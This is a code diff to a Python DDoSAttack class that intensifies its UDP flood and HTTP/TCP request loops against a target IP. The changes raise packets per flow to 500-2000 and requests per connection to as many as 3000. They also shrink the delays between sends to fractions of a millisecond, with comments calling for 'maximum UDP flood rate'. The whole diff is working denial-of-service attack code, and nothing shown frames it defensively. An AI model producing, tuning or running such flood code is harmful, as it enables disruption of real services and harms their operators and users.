@@ -67,8 +67,8 @@ class DDoSAttack:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.settimeout(1)
                 
-                # INCREASED: Send 50-200 packets per flow (was 1)
-                num_packets = random.randint(50, 200)
+                # EXTREME: Send 500-2000 packets per flow (10x increase from current 50-200)
+                num_packets = random.randint(500, 2000)
                 port = random.choice(udp_ports)
                 
                 for _ in range(num_packets):
@@ -79,8 +79,8 @@ class DDoSAttack:
                         self._inc_count()
                     except Exception:
                         break
-                    # Minimal delay between packets
-                    time.sleep(random.uniform(0.001, 0.01))
+                    # No delay - maximum UDP flood rate
+                    time.sleep(random.uniform(0.00001, 0.0001))
                 
                 sock.close()
             except Exception:
@@ -109,7 +109,7 @@ class DDoSAttack:
                 sock.connect((self.target_ip, attack_port))
 
                 # INCREASED: 100-300 requests per connection (was 1-5)
-                for _ in range(random.randint(100, 300)):
+                for _ in range(random.randint(1000, 3000)):
                     if not self.running or time.time() >= end_time:
                         break
 
@@ -133,8 +133,8 @@ class DDoSAttack:
                         pass
                     sock.settimeout(10)
                     
-                    # Minimal delay between requests
-                    time.sleep(random.uniform(0.001, 0.005))
+                    # No delay - maximum request rate
+                    time.sleep(random.uniform(0.0001, 0.0005))
 
                 sock.close()
             except Exception:
@@ -170,8 +170,8 @@ class DDoSAttack:
                 attack_port = random.choice(http_ports)
                 sock.connect((self.target_ip, attack_port))
 
-                # Send 1-3 POST requests per connection (VARIATION on timing)
-                requests_this_conn = random.randint(50, 100)
+                # Send 500-1000 POST requests per connection (10x increase from 50-100)
+                requests_this_conn = random.randint(500, 1000)
                 for _ in range(requests_this_conn):
                     if not self.running or time.time() >= end_time:
                         break
@@ -201,8 +201,8 @@ class DDoSAttack:
                     except socket.timeout:
                         pass
                     
-                    # Minimal delay between requests
-                    time.sleep(random.uniform(0.001, 0.005))
+                    # No delay - maximum request rate
+                    time.sleep(random.uniform(0.0001, 0.0005))
 
                 sock.close()
             except Exception:
